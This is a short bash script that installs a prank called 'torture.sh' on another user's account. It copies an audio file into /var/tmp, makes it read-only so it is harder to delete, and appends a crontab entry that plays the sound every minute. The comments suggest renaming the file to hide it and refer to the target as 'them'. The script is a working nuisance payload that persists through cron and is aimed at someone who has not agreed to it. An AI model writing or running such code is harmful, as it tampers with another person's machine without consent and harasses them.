#!/bin/bash

# Run this script to set up torture.sh on the user's crontab

# this is where the audio file will be stored
# If you're feeling particularly devious, you can change the path or even the file name
# Note that on MacOS, files in HOME will likely be protected and crontab will be unable to access them without explicit permissions
audio_path="/var/tmp/gnome"

if [[ ! -f "$audio_path" ]]; then
    cp gnome.mp3 "$audio_path"
    chmod 444 "$audio_path" # make sure that it can be played, and also make it harder for them to delete
fi

crontab -l | {
    cat
    echo "* * * * * mpg123 -q \"$audio_path\""
} | crontab -
